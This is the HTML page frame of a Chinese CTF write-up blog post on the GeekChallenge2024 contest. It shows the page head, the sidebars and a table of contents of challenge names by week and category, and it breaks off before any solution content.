<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>GeekChallenge2024 第十五届极客大挑战 | Lazzaro</title><meta name="description" content="​     三叶草安全技术小组第十五届极客大挑战 极客大挑战是由三叶草安全技术小组自发组织举办的一场全国性网络安全赛事，目前，极客大挑战已成功举办十四届，吸引了超两万五千人次参加，累计提供超1000道赛题，广受全国各地参赛人员好评。作为国内最早一批举办的新生赛，极客大挑战一直以加强行业交流和提供优质学习平台为初心，为广大高校的信息安全学子提供了一个便捷的网络安全实战入门途径。 线上竞赛"><meta property="og:type" content="article"><meta property="og:title" content="GeekChallenge2024 第十五届极客大挑战"><meta property="og:url" content="https://lazzzaro.github.io/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="​     三叶草安全技术小组第十五届极客大挑战 极客大挑战是由三叶草安全技术小组自发组织举办的一场全国性网络安全赛事，目前，极客大挑战已成功举办十四届，吸引了超两万五千人次参加，累计提供超1000道赛题，广受全国各地参赛人员好评。作为国内最早一批举办的新生赛，极客大挑战一直以加强行业交流和提供优质学习平台为初心，为广大高校的信息安全学子提供了一个便捷的网络安全实战入门途径。 线上竞赛"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2024-11-06T13:31:12.000Z"><meta property="article:modified_time" content="2024-11-19T10:26:37.494Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2024赛"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://lazzzaro.github.io/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">50</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13px">2025赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1"><span class="toc-number">1.</span> <span class="toc-text">Week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2024-geek-challenge-%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">2024 geek challenge!签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-jpg"><span class="toc-number">1.1.2.</span> <span class="toc-text">ez_jpg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Truth-of-Word"><span class="toc-number">1.1.3.</span> <span class="toc-text">Truth of Word</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome-jail"><span class="toc-number">1.1.4.</span> <span class="toc-text">Welcome_jail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%AA"><span class="toc-number">1.1.5.</span> <span class="toc-text">雪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I-wanna-go-to-SYC"><span class="toc-number">1.1.6.</span> <span class="toc-text">I_wanna_go_to_SYC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AF%E6%92%92%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">凯撒加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-number">1.2.2.</span> <span class="toc-text">RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X0R"><span class="toc-number">1.2.3.</span> <span class="toc-text">X0R</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dp"><span class="toc-number">1.2.4.</span> <span class="toc-text">dp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.5.</span> <span class="toc-text">共模攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%98%AF%E5%A5%97%E5%A8%83"><span class="toc-number">1.2.6.</span> <span class="toc-text">不是套娃</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#100-%E7%9A%84%E2%9A%AA"><span class="toc-number">1.3.1.</span> <span class="toc-text">100%的⚪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce-me"><span class="toc-number">1.3.2.</span> <span class="toc-text">rce_me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-upload"><span class="toc-number">1.3.3.</span> <span class="toc-text">baby_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Problem-On-My-Web"><span class="toc-number">1.3.4.</span> <span class="toc-text">Problem_On_My_Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpop"><span class="toc-number">1.3.5.</span> <span class="toc-text">ezpop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-re"><span class="toc-number">1.4.1.</span> <span class="toc-text">hello_re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E6%9D%A5%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E9%A2%98"><span class="toc-number">1.4.2.</span> <span class="toc-text">先来一道简单题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E8%AE%B8%E4%BD%A0%E4%B9%9F%E5%90%ACjay"><span class="toc-number">1.4.3.</span> <span class="toc-text">也许你也听jay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7%E4%BD%A0%E7%9A%84%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.4.</span> <span class="toc-text">让我康康你的调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%8B%92%E4%B8%AAz3%E5%95%8A"><span class="toc-number">1.4.5.</span> <span class="toc-text">我勒个z3啊</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezzzz"><span class="toc-number">1.4.6.</span> <span class="toc-text">ezzzz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E4%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%E5%90%97"><span class="toc-number">1.5.1.</span> <span class="toc-text">你会栈溢出吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E7%AD%BE%E5%88%B0"><span class="toc-number">1.5.2.</span> <span class="toc-text">简单的签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-shellcode"><span class="toc-number">1.5.3.</span> <span class="toc-text">ez_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00000"><span class="toc-number">1.5.4.</span> <span class="toc-text">00000</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%B0%E9%BB%91%E5%90%97%E5%96%BD%E4%BA%86%E5%90%97"><span class="toc-number">1.5.5.</span> <span class="toc-text">买黑吗喽了吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#over-flow"><span class="toc-number">1.5.6.</span> <span class="toc-text">over_flow??</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week2"><span class="toc-number">2.</span> <span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-1"><span class="toc-number">2.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-pcap-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">ez_pcap_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cimbar"><span class="toc-number">2.1.2.</span> <span class="toc-text">cimbar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E7%9A%84%E8%A7%89%E9%86%92"><span class="toc-number">2.1.3.</span> <span class="toc-text">舔狗的觉醒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%8C%E9%BE%9F"><span class="toc-number">2.1.4.</span> <span class="toc-text">乌龟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-climbstairs"><span class="toc-number">2.1.5.</span> <span class="toc-text">ez_climbstairs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doSomeMath"><span class="toc-number">2.1.6.</span> <span class="toc-text">doSomeMath</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number">2.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nc"><span class="toc-number">2.2.1.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ncoCRT"><span class="toc-number">2.2.2.</span> <span class="toc-text">ncoCRT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inPEM"><span class="toc-number">2.2.3.</span> <span class="toc-text">inPEM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECBpad"><span class="toc-number">2.2.4.</span> <span class="toc-text">ECBpad</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number">2.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-http"><span class="toc-number">2.3.1.</span> <span class="toc-text">ez_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Can-you-Pass-Me"><span class="toc-number">2.3.2.</span> <span class="toc-text">Can_you_Pass_Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-include"><span class="toc-number">2.3.3.</span> <span class="toc-text">ez_include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecretInDrivingSchool"><span class="toc-number">2.3.4.</span> <span class="toc-text">SecretInDrivingSchool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-SSRF"><span class="toc-number">2.3.5.</span> <span class="toc-text">ez_SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-1"><span class="toc-number">2.4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E9%A2%88%E9%B9%BF%E5%96%9C%E6%AC%A2%E5%90%83%E5%BD%A9%E8%99%B9"><span class="toc-number">2.4.1.</span> <span class="toc-text">长颈鹿喜欢吃彩虹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84RC4"><span class="toc-number">2.4.2.</span> <span class="toc-text">奇怪的RC4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%BD%E5%83%8F%E6%98%AFpython%EF%BC%9F"><span class="toc-number">2.4.3.</span> <span class="toc-text">好像是python？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DH%E7%88%B1%E5%96%9D%E8%8C%B6"><span class="toc-number">2.4.4.</span> <span class="toc-text">DH爱喝茶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%A9%E5%B0%B1%E8%A1%8C%E4%BA%86"><span class="toc-number">2.4.5.</span> <span class="toc-text">玩就行了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CPP-flower"><span class="toc-number">2.4.6.</span> <span class="toc-text">CPP_flower</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-1"><span class="toc-number">2.5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#su"><span class="toc-number">2.5.1.</span> <span class="toc-text">su~~~~</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week3"><span class="toc-number">3.</span> <span class="toc-text">Week3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-2"><span class="toc-number">3.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensics"><span class="toc-number">3.1.1.</span> <span class="toc-text">Forensics</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-2"><span class="toc-number">3.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ecc"><span class="toc-number">3.2.1.</span> <span class="toc-text">ecc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRSA"><span class="toc-number">3.2.2.</span> <span class="toc-text">ezRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RnoCRT"><span class="toc-number">3.2.3.</span> <span class="toc-text">RnoCRT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LLL"><span class="toc-number">3.2.4.</span> <span class="toc-text">LLL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-2"><span class="toc-number">3.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#py-game"><span class="toc-number">3.3.1.</span> <span class="toc-text">py_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%8D%E6%AF%94Java%E5%B7%AE"><span class="toc-number">3.3.2.</span> <span class="toc-text">PHP不比Java差</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-2"><span class="toc-number">3.4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-hook"><span class="toc-number">3.4.1.</span> <span class="toc-text">ez_hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E5%B9%B2%E5%98%9B"><span class="toc-number">3.4.2.</span> <span class="toc-text">你干嘛~~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blasting-master"><span class="toc-number">3.4.3.</span> <span class="toc-text">blasting_master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%B4%E6%88%91%E7%9A%84%E6%98%9F%E6%98%9F"><span class="toc-number">3.4.4.</span> <span class="toc-text">致我的星星</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES"><span class="toc-number">3.4.5.</span> <span class="toc-text">AES!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Crypto"><span class="toc-number">3.5.</span> <span class="toc-text">Reverse&#x2F;Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LinkedListModular"><span class="toc-number">3.5.1.</span> <span class="toc-text">LinkedListModular</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-Web"><span class="toc-number">3.6.</span> <span class="toc-text">Crypto&#x2F;Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt-pickle"><span class="toc-number">3.6.1.</span> <span class="toc-text">jwt_pickle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Pwn"><span class="toc-number">3.7.</span> <span class="toc-text">Reverse&#x2F;Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WhoIsAdmin"><span 